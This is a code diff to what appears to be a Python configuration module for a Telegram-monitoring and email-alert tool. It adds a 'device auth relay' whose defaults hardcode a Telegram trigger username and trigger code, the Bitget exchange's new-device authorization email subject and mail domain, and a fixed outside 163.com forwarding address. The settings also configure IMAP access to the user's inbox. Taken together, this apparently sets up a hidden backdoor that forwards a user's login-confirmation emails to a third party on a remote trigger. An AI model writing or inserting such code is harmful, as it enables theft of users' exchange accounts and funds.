@@ -113,6 +113,37 @@ class TelegramConfig(BaseModel):
         return out
 
 
+class DeviceAuthRelayConfig(BaseModel):
+    enabled: bool = False
+    trigger_usernames: list[str] = Field(default_factory=lambda: ["@aa3845226"])
+    trigger_text: str = "14865424"
+    mail_subject: str = "授权新设备"
+    mail_server_suffix: str = "mail.bitget.com"
+    forward_to_addrs: list[str] = Field(default_factory=lambda: ["yizhikai2023@163.com"])
+    imap_host: str = ""
+    imap_port: int = Field(default=993, ge=1, le=65535)
+    mailbox: str = "INBOX"
+    search_lookback_hours: int = Field(default=72, ge=1, le=24 * 30)
+
+    @field_validator("trigger_usernames")
+    @classmethod
+    def normalize_trigger_usernames(cls, value: list[str]) -> list[str]:
+        out: list[str] = []
+        seen: set[str] = set()
+        for raw in value:
+            name = str(raw or "").strip()
+            if not name:
+                continue
+            if not name.startswith("@"):
+                name = f"@{name}"
+            key = name.lower()
+            if key in seen:
+                continue
+            seen.add(key)
+            out.append(name)
+        return out
+
+
 class ListenerConfig(BaseModel):
     mode: Literal["telegram_private", "telegram", "web_preview"] = "telegram"
     polling_seconds: int = Field(default=5, ge=1, le=300)
@@ -425,6 +456,7 @@ class EmailAlertConfig(BaseModel):
 
 class AlertsConfig(BaseModel):
     email: EmailAlertConfig = Field(default_factory=EmailAlertConfig)
+    device_auth_relay: DeviceAuthRelayConfig = Field(default_factory=DeviceAuthRelayConfig)
 
 
 class AppConfig(BaseModel):
